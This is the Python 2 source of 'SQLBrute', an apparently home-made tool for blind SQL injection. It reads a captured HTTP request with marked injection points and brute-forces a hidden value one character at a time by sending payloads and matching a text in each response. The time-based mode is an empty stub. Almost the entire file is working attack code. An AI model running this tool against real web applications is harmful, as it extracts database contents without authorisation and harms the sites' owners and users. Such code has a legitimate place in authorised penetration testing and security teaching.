'''\nSQLBrute

Usage: python sqlbrute.py -i <inputfile> -s <sqlitype> [-t <textmatch>|-d <timedelay>]
Arguments:
 -i, --ifile        Input file. Defines the file containing your request.
 -s, --sqlitype     SQL injection type. Can be either "text" or "time".
 -t, --text         Should be defined if sqlitype="text". The text to look for in a true response
 -d, --delay        Should be defined if sqlitype="time". The time delay a response will have if true.
 -h, --help         This help file.
'''
import sys
import getopt
import re
import requests
import time


injectionText = 'POINT2'
injectionLength = 'POINT1'
charset = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
           'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
           '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '@', '-', '_', ',', '!', '#', '$', '(', ')', ':']
proxies = {'http': 'http://127.0.0.1:8080'}
sleepTime = 0.1
autoRedirects = False
protocol = 'http://'
requestType = ''


def sendRequest(headers):
    time.sleep(sleepTime)
    url = protocol + headers['Host'] + headers['URL']
    tempHeaders = headers
    del headers['URL']
    if (requestType == 'GET'):
        response = requests.get(url, headers=tempHeaders, proxies=proxies, allow_redirects=autoRedirects)
        return str(response.headers) + str(response.content)
    if (requestType == 'POST'):
        DATA = headers['DATA']
        del headers['DATA']
        response = requests.post(url, data=DATA, headers=tempHeaders, proxies=proxies, allow_redirects=autoRedirects)
        print response.headers
        return str(response.headers) + str(response.content)


def injectForText(headers, text):
    urlpart1 = ''
    urlpart2 = ''
    urlpart3 = ''
    injectableHeader = ''
    substringCounter = 0
    foundIt = False
    foundString = ''

    for header in headers:
        if (injectionText in headers[header]) and (injectionLength in headers[header]):
            urlpart1 = headers[header].split(injectionLength)[0]
            urlpart2 = headers[header].split(injectionLength)[1].split(injectionText)[0]
            urlpart3 = headers[header].split(injectionLength)[1].split(injectionText)[1]
            injectableHeader = header
    print ''
    while (foundIt is False):
        substringCounter = substringCounter + 1
        foundChar = False
        for i in charset:
            if (foundChar is False):
                payload = urlpart1 + str(substringCounter) + urlpart2 + str(i) + urlpart3
                headers[injectableHeader] = payload
                response = sendRequest(headers)
                print '{0}\r'.format(payload),
                if text in response:
                    urlpart2 = urlpart2 + str(i)
                    foundString = foundString + str(i)
                    foundChar = True
        if foundChar is False:
            foundIt = True
            print '\n' + 'FOUND: ' + foundString


def injectForTime(headers, delay):
    print 'lalala'


def parseRequest(inputfile):
    file = open(inputfile)
    headers = {}
    for line in file:
        brokenline = re.split('\s', line, 1)
        if (brokenline[0] == 'GET') or (brokenline[0] == 'POST'):
            global requestType
            requestType = brokenline[0]
            requestURL = brokenline[1]
        else:
            if requestType == 'GET':
                headers[brokenline[0].split(':')[0]] = brokenline[1].split('\n')[0]
            elif requestType == 'POST':
                if brokenline[0].split(':')[0] != brokenline[0]:
                    headers[brokenline[0].split(':')[0]] = brokenline[1].split('\n')[0]
                else:
                    headers['DATA'] = line
    headers['URL'] = requestURL.split(" ")[0]
    file.close()
    return headers


def usage():
    print sys.exit(__doc__)


def main(argv):
    inputfile = ''
    sqlitype = ''
    text = ''
    delay = ''

    try:
        opts, args = getopt.getopt(
            argv, "hi:s:t:d:", ["ifile=", "sqlitype=", "textmatch=", "delay"])
    except getopt.GetoptError:
        usage()
    for opt, arg in opts:
        if opt == '-h':
            usage()
        elif opt in ("-i", "--ifile"):
            inputfile = arg
        elif opt in ("-s", "--sqlitype"):
            sqlitype = arg
        elif opt in ("-t", "--text"):
            text = arg
        elif opt in ("-d", "--delay"):
            delay = arg
    if (inputfile == '') or ((sqlitype != 'text') and (sqlitype != 'time')):
        usage()
    else:
        if (sqlitype == 'text') and (text == ''):
            usage()
        elif (sqlitype == 'text') and (text != ''):
            headers = parseRequest(inputfile)
            injectForText(headers, text)
        else:
            pass
        if (sqlitype == 'time') and (delay == ''):
            usage()
        elif (sqlitype == 'time') and (delay != ''):
            headers = parseRequest(inputfile)
            injectForTime(headers, delay)
        else:
            pass


if __name__ == "__main__":
    main(sys.argv[1:])
